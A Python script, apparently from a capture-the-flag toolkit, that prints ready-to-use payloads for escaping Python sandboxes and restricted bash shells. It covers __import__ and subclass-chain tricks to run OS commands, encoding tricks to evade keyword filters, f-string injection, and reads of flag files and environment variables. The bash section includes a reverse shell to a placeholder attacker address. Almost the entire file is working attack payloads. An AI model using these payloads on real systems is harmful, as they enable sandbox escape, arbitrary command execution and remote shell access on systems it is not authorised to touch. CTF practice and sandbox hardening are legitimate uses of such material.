#!/usr/bin/env python3
"""
Sentinel CTF Framework — Misc Template
=======================================
jail_escape.py  ·  Python Jail Escape Helper

Generates copy-paste ready payloads for every common Python jail
escape technique, plus bash jail escapes. Does NOT execute anything
in the target environment — it only prints the payloads.

Usage
-----
    python jail_escape.py [--code "print(dir(__builtins__))"]
    python jail_escape.py --filter "import,exec,eval" --show-all

Author  : Sentinel CTF Framework
License : MIT
"""

from __future__ import annotations

import argparse
import ast
import base64
import re
import sys
from typing import Optional

# ---------------------------------------------------------------------------
# Rich console (optional)
# ---------------------------------------------------------------------------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax
    from rich.table import Table
    from rich.text import Text

    console = Console(highlight=False)
    RICH = True
except ImportError:
    RICH = False

    class _FallbackConsole:  # noqa: D101
        def print(self, *a, **kw):  # noqa: D102
            text = " ".join(str(x) for x in a)
            text = re.sub(r"\[/?[^\]]+\]", "", text)
            print(text)

        def rule(self, title="", **kw):  # noqa: D102
            print(f"\n{'─'*60}  {title}")

    console = _FallbackConsole()

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def section(title: str) -> None:
    if RICH:
        console.rule(f"[bold cyan]{title}[/bold cyan]")
    else:
        print(f"\n{'─'*60}  {title}")


def show_payload(label: str, payload: str, description: str = "") -> None:
    """Print a single payload with label and optional description."""
    if RICH:
        console.print(f"\n  [bold yellow]►[/bold yellow] [bold]{label}[/bold]")
        if description:
            console.print(f"    [dim]{description}[/dim]")
        console.print(
            Syntax(payload, "python", theme="monokai", background_color="default",
                   word_wrap=True, padding=(0, 4))
        )
    else:
        print(f"\n  ► {label}")
        if description:
            print(f"    # {description}")
        print(f"    {payload}")


def show_bash_payload(label: str, payload: str, description: str = "") -> None:
    """Print a bash payload."""
    if RICH:
        console.print(f"\n  [bold yellow]►[/bold yellow] [bold]{label}[/bold]")
        if description:
            console.print(f"    [dim]{description}[/dim]")
        console.print(
            Syntax(payload, "bash", theme="monokai", background_color="default",
                   word_wrap=True, padding=(0, 4))
        )
    else:
        print(f"\n  ► {label}")
        if description:
            print(f"    # {description}")
        print(f"    {payload}")


def encode_b64(code: str) -> str:
    """Return a base64 encoding of *code*."""
    return base64.b64encode(code.encode()).decode()


def encode_hex(code: str) -> str:
    """Return a hex-encoded version of *code*."""
    return code.encode().hex()


# ---------------------------------------------------------------------------
# TECHNIQUE 1 — __import__ variations
# ---------------------------------------------------------------------------


def technique_import(cmd: str = "id") -> None:
    """Generate __import__ bypass payloads."""
    section("TECHNIQUE 1 · __import__ Variations")

    os_b64 = encode_b64("os")
    os_hex = encode_hex("os")

    payloads = [
        # Basic
        (
            "Direct __import__",
            f'__import__("os").system("{cmd}")',
            "Works when __import__ is not blocked",
        ),
        # Base64-encoded module name
        (
            "Base64 module name",
            f'__import__(__import__("base64").b64decode("{os_b64}").decode()).system("{cmd}")',
            "Bypasses string blacklists containing 'os'",
        ),
        # Hex-encoded
        (
            "Hex-encoded module name",
            f'__import__(bytes.fromhex("{os_hex}").decode()).system("{cmd}")',
            "Hex bypass for 'os' keyword filter",
        ),
        # Using importlib
        (
            "importlib.import_module",
            f'__import__("importlib").import_module("os").system("{cmd}")',
            "Use importlib as an alternative to __import__",
        ),
        # chr() concatenation
        (
            "chr() concatenation (os)",
            f'__import__(chr(111)+chr(115)).system("{cmd}")',
            "Build module name using chr() — bypasses string literals",
        ),
        # Subprocess via __import__
        (
            "subprocess via __import__",
            f'__import__("subprocess").check_output(["/bin/sh","-c","{cmd}"]).decode()',
            "Use subprocess instead of os.system",
        ),
    ]
    for label, payload, desc in payloads:
        show_payload(label, payload, desc)


# ---------------------------------------------------------------------------
# TECHNIQUE 2 — __class__.__mro__ subclass chain
# ---------------------------------------------------------------------------


def technique_subclass_chain(cmd: str = "id") -> None:
    """Generate MRO subclass chain payloads."""
    section("TECHNIQUE 2 · __class__.__mro__ Subclass Chain")

    payloads = [
        # Find subprocess.Popen via subclasses
        (
            "Find subprocess.Popen index",
            (
                "# Run this to find the index:\n"
                "[i for i,c in enumerate(''.__class__.__mro__[1].__subclasses__()) "
                "if 'Popen' in c.__name__]"
            ),
            "Identifies which subclass index is subprocess.Popen",
        ),
        (
            "Execute via Popen (generic)",
            (
                "# Replace INDEX with the Popen index found above\n"
                "''.__class__.__mro__[1].__subclasses__()[INDEX]"
                f'(["/bin/sh","-c","{cmd}"],stdout=-1).communicate()'
            ),
            "Calls Popen without naming it directly",
        ),
        (
            "One-liner: search + execute",
            (
                "[c for c in [].__class__.__base__.__subclasses__() "
                "if 'Popen' in repr(c)][0]"
                f'(["/bin/sh","-c","{cmd}"],stdout=-1).communicate()'
            ),
            "Finds and calls Popen in a single expression",
        ),
        (
            "Via warning.catch_warnings (classic)",
            (
                "''.__class__.__mro__[2].__subclasses__()[59]()._module.__builtins__"
                "['__import__']('os').system('id')\n"
                "# Note: index 59 is for Python 2; use the finder above for Python 3"
            ),
            "Classic Python 2 technique; adapt index for Python 3",
        ),
        (
            "Find os._wrap_close (Python 3)",
            (
                "# os._wrap_close gives direct access to os module\n"
                "[c for c in [].__class__.__base__.__subclasses__() "
                "if c.__name__ == '_wrap_close'][0]"
                ".__init__.__globals__['system']('id')"
            ),
            "Works in many Python 3 restricted environments",
        ),
        (
            "Find __builtins__ via any class",
            (
                "''.__class__.__mro__[-1].__subclasses__()[0]"
                ".__init__.__globals__['__builtins__']"
            ),
            "Recover __builtins__ dict through subclass globals",
        ),
        (
            "Complete subclass index scanner",
            (
                "for i,c in enumerate("
                "''.__class__.__mro__[-1].__subclasses__()):\n"
                "    try:\n"
                "        if '__globals__' in dir(c.__init__):\n"
                "            g = c.__init__.__globals__\n"
                "            if 'os' in g: print(i,'os found')\n"
                "            if 'sys' in g: print(i,'sys found')\n"
                "    except: pass"
            ),
            "Scans all subclasses for useful globals",
        ),
    ]
    for label, payload, desc in payloads:
        show_payload(label, payload, desc)


# ---------------------------------------------------------------------------
# TECHNIQUE 3 — Builtins recovery
# ---------------------------------------------------------------------------


def technique_builtins(cmd: str = "id") -> None:
    """Generate builtins recovery payloads."""
    section("TECHNIQUE 3 · Builtins Recovery")

    payloads = [
        (
            "Via __builtins__ dict (Python 3)",
            "__builtins__.__dict__['__import__']('os').system('id')",
            "Access __import__ from the builtins dict",
        ),
        (
            "Via globals()['__builtins__']",
            "globals()['__builtins__']['__import__']('os').system('id')",
            "Use globals() to reach builtins",
        ),
        (
            "Via locals() + exec",
            (
                "exec(compile('import os; os.system(\"id\")', '<str>', 'exec'), "
                "{'__builtins__': __builtins__})"
            ),
            "Create a fresh exec context with builtins",
        ),
        (
            "Rebuild exec from builtins",
            (
                "_b = [x for x in (1).__class__.__mro__[-1].__subclasses__()\n"
                "      if x.__name__ == 'catch_warnings'][0]()\n"
                "_b.__init__.__globals__['__builtins__']['exec']"
                f"('import os; os.system(\"{cmd}\")')"
            ),
            "Reach exec through the builtins of a class in catch_warnings",
        ),
        (
            "Via __loader__.load_module",
            (
                "__loader__.load_module('os').system('id')\n"
                "# __loader__ may be available in some restricted environments"
            ),
            "Use the module loader to import os",
        ),
        (
            "dir(__builtins__) inspection",
            "print(dir(__builtins__))",
            "List what builtins are still available",
        ),
        (
            "vars() / dir() inspection",
            "print(vars())\nprint(dir())",
            "Inspect what names are in the current scope",
        ),
    ]
    for label, payload, desc in payloads:
        show_payload(label, payload, desc)


# ---------------------------------------------------------------------------
# TECHNIQUE 4 — exec/eval encoding bypasses
# ---------------------------------------------------------------------------


def technique_exec_encoding(cmd: str = "id") -> None:
    """Generate exec/eval encoding bypass payloads."""
    section("TECHNIQUE 4 · exec / eval Encoding Bypasses")

    code = f'import os; os.system("{cmd}")'
    b64 = encode_b64(code)
    hex_str = encode_hex(code)
    chr_concat = "+".join(f"chr({ord(c)})" for c in code)

    payloads = [
        (
            "exec + base64",
            f'exec(__import__("base64").b64decode("{b64}").decode())',
            "Encode entire payload as base64",
        ),
        (
            "exec + hex",
            f'exec(bytes.fromhex("{hex_str}").decode())',
            "Encode entire payload as hex",
        ),
        (
            "exec + chr() concatenation",
            f"exec({chr_concat})",
            "Build code string char-by-char using chr()",
        ),
        (
            "eval with compile",
            f'eval(compile({repr(code)}, "<string>", "exec"))',
            "Use compile() to convert string to code object",
        ),
        (
            "exec via map/join",
            (
                "exec(''.join(map(chr,["
                + ",".join(str(ord(c)) for c in code)
                + "])))"
            ),
            "Build code from list of ordinals via map+join",
        ),
        (
            "Obfuscated exec name",
            (
                "# When 'exec' is blocked as a word:\n"
                "getattr(__builtins__, 'ex'+'ec')('import os; os.system(\"id\")')"
            ),
            "Bypass keyword filter by splitting 'exec'",
        ),
    ]
    for label, payload, desc in payloads:
        show_payload(label, payload, desc)


# ---------------------------------------------------------------------------
# TECHNIQUE 5 — f-string injection
# ---------------------------------------------------------------------------


def technique_fstring(cmd: str = "id") -> None:
    """Generate f-string injection payloads."""
    section("TECHNIQUE 5 · f-string Injection")

    payloads = [
        (
            "f-string with __import__",
            f'f"{{__import__(\'os\').system(\'{cmd}\')}}"',
            "Executes code inside an f-string expression",
        ),
        (
            "f-string with getattr",
            (
                'f"{getattr(__import__(\'os\'), \'system\')(\'id\')}"'
            ),
            "Use getattr to avoid attribute access patterns",
        ),
        (
            "Nested f-strings (Python 3.12+)",
            (
                "# Python 3.12 allows full expressions in f-strings:\n"
                'f"{exec(\'import os; os.system(chr(105)+chr(100))\')}\"'
            ),
            "Python 3.12 nested f-strings allow more complex expressions",
        ),
        (
            "f-string variable escape",
            (
                "x = 'id'\n"
                "f\"{__import__('os').system(x)}\""
            ),
            "Use a variable to hold the command string",
        ),
    ]
    for label, payload, desc in payloads:
        show_payload(label, payload, desc)


# ---------------------------------------------------------------------------
# TECHNIQUE 6 — Global / local variable inspection
# ---------------------------------------------------------------------------


def technique_inspection(cmd: str = "id") -> None:
    """Generate variable/frame inspection payloads."""
    section("TECHNIQUE 6 · Global / Local Inspection")

    payloads = [
        (
            "Inspect globals for interesting objects",
            (
                "import pprint\n"
                "pprint.pprint(globals())"
            ),
            "Find what's already imported or available in global scope",
        ),
        (
            "Inspect locals",
            "print(locals())",
            "See local scope — jail may inject useful objects",
        ),
        (
            "Frame walking",
            (
                "import sys\n"
                "frame = sys._getframe(0)\n"
                "while frame:\n"
                "    print(list(frame.f_globals.keys()))\n"
                "    frame = frame.f_back"
            ),
            "Walk up call frames to find globals of outer scopes",
        ),
        (
            "Scan for secret in all globals/locals",
            (
                "for k, v in {**globals(), **locals()}.items():\n"
                "    if 'flag' in str(k).lower() or 'flag' in str(v).lower():\n"
                "        print(k, '=', v)"
            ),
            "Directly search for the flag in all accessible names",
        ),
        (
            "Read flag file if path is guessable",
            (
                "open('/flag').read()\n"
                "open('/flag.txt').read()\n"
                "open('/home/user/flag').read()\n"
                "open('/tmp/flag.txt').read()"
            ),
            "Common flag file locations",
        ),
        (
            "List /",
            "__import__('os').listdir('/')",
            "List the root filesystem to find flag file",
        ),
        (
            "Environment variables",
            "__import__('os').environ",
            "Check if the flag was passed via environment variable",
        ),
    ]
    for label, payload, desc in payloads:
        show_payload(label, payload, desc)


# ---------------------------------------------------------------------------
# BASH JAIL ESCAPES
# ---------------------------------------------------------------------------


def bash_escapes() -> None:
    """Generate bash jail escape payloads."""
    section("BASH JAIL ESCAPES")

    payloads = [
        # PATH bypass
        (
            "PATH bypass — explicit path",
            '/bin/sh\n/usr/bin/python3 -c "import os; os.system(\'id\')"',
            "Use full paths when only PATH is restricted",
        ),
        # History expansion
        (
            "History expansion",
            "!!\n!-1\n!$",
            "Bash history expansion to re-run previous commands",
        ),
        # $'...' ANSI-C quoting to bypass filters
        (
            "$'...' ANSI-C quoting",
            "$'\\x69\\x64'",
            "Encode command chars using ANSI-C hex escape (id = \\x69\\x64)",
        ),
        # Brace expansion
        (
            "Brace expansion for string construction",
            "{/bin/sh,}",
            "Brace expansion to build the command string",
        ),
        # Variable splicing
        (
            "Variable splicing to bypass keyword filters",
            'a=i;b=d;$a$b',
            "Concatenate parts of the blocked command via variables",
        ),
        # Glob-based command lookup
        (
            "Glob to find and run commands",
            "/???/??  (e.g., /bin/sh)\n/usr/???/??????3  (e.g., /usr/bin/python3)",
            "Use ? glob to match blocked command names",
        ),
        # Read flag directly in bash
        (
            "Read flag with cat alternatives",
            "cat /flag\nless /flag\nmore /flag\ntail /flag\nhead /flag",
            "Try cat alternatives if cat is blocked",
        ),
        # Reverse shell
        (
            "Bash reverse shell",
            "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "Open a reverse shell back to your listener",
        ),
        # Python inside bash
        (
            "Python one-liner in bash",
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "Spawn a PTY from Python if python3 is available",
        ),
        # Restricted shell escape
        (
            "Escape restricted shell (rbash)",
            (
                "# Try these in order:\n"
                "bash --norc\n"
                "sh\n"
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
                "awk 'BEGIN {system(\"/bin/sh\")}'\n"
                "find / -name flag 2>/dev/null"
            ),
            "Common rbash escape techniques",
        ),
    ]
    for label, payload, desc in payloads:
        show_bash_payload(label, payload, desc)


# ---------------------------------------------------------------------------
# Payload menu / summary
# ---------------------------------------------------------------------------


def print_menu() -> None:
    """Print the technique menu."""
    if RICH:
        table = Table(title="Python Jail Escape Techniques", show_lines=True)
        table.add_column("#", style="cyan", width=4)
        table.add_column("Technique", style="bold white", width=40)
        table.add_column("When to use", style="dim", width=50)

        techniques = [
            ("1", "__import__ variations",             "When import statement is blocked"),
            ("2", "__class__.__mro__ subclass chain",  "When __import__ itself is blocked"),
            ("3", "Builtins recovery",                 "When builtins are deleted/restricted"),
            ("4", "exec/eval encoding",                "When keywords are string-filtered"),
            ("5", "f-string injection",                "When input ends up inside an f-string"),
            ("6", "Global/local inspection",           "To find the flag directly in scope"),
            ("B", "Bash jail escapes",                 "For shell-level restricted environments"),
        ]
        for row in techniques:
            table.add_row(*row)
        console.print(table)
    else:
        print("\n  Python Jail Escape Techniques:")
        for n, t, w in [
            ("1", "__import__ variations",             "When import statement is blocked"),
            ("2", "__class__.__mro__ subclass chain",  "When __import__ itself is blocked"),
            ("3", "Builtins recovery",                 "When builtins are deleted/restricted"),
            ("4", "exec/eval encoding",                "When keywords are string-filtered"),
            ("5", "f-string injection",                "When input ends up in an f-string"),
            ("6", "Global/local inspection",           "Find flag directly in scope"),
            ("B", "Bash jail escapes",                 "Shell-level restricted environments"),
        ]:
            print(f"  {n:>2}. {t:<38} {w}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Sentinel CTF — Python Jail Escape Helper",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument(
        "--code",
        default=None,
        help="The jail's restricted eval/exec code (for context; not executed locally)",
    )
    p.add_argument(
        "--cmd",
        default="id",
        help="OS command to inject (default: 'id')",
    )
    p.add_argument(
        "--filter",
        default="",
        metavar="KEYWORDS",
        help="Comma-separated list of blocked keywords (to skip irrelevant techniques)",
    )
    p.add_argument(
        "--technique", "-t",
        choices=["1", "2", "3", "4", "5", "6", "bash", "all"],
        default="all",
        help="Show only specific technique (default: all)",
    )
    return p.parse_args()


def main() -> None:
    args = parse_args()

    if RICH:
        panel_text = (
            f"[bold]Target command:[/bold] {args.cmd}\n"
            f"[bold]Filtered keywords:[/bold] {args.filter or '(none provided)'}"
        )
        if args.code:
            panel_text += f"\n[bold]Jail code:[/bold] {args.code[:120]}"
        console.print(
            Panel(
                panel_text,
                title="[bold yellow]Sentinel CTF · Python Jail Escape Helper[/bold yellow]",
                border_style="bright_cyan",
            )
        )

    print_menu()

    blocked = {kw.strip() for kw in args.filter.split(",") if kw.strip()}
    if blocked:
        console.print(f"\n[yellow]ℹ Blocked keywords: {', '.join(blocked)}[/yellow]")

    t = args.technique
    cmd = args.cmd

    if t in ("1", "all"):
        technique_import(cmd)
    if t in ("2", "all"):
        technique_subclass_chain(cmd)
    if t in ("3", "all"):
        technique_builtins(cmd)
    if t in ("4", "all"):
        technique_exec_encoding(cmd)
    if t in ("5", "all"):
        technique_fstring(cmd)
    if t in ("6", "all"):
        technique_inspection(cmd)
    if t in ("bash", "all"):
        bash_escapes()

    section("TIPS")
    console.print("    • Always start by inspecting: print(dir()), print(globals()), print(type(''))")
    console.print("    • Check Python version: import sys; sys.version")
    console.print("    • If 'import' is blocked as text, try: __builtins__.__import__")
    console.print("    • Many jails filter on __import__ but forget importlib")
    console.print("    • Use pwntools: python3 jail_escape.py | nc <target> <port>")


if __name__ == "__main__":
    main()
